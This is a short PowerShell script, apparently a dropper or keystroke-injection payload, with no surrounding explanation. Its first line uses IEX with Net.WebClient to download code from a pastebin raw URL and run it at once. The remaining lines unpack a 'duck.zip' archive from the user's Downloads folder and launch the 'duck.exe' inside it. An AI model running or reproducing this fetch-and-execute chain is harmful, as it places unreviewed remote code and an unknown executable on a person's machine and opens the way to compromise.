IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE')
Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
Start-Process Downloads\duck\duck\duck.exe
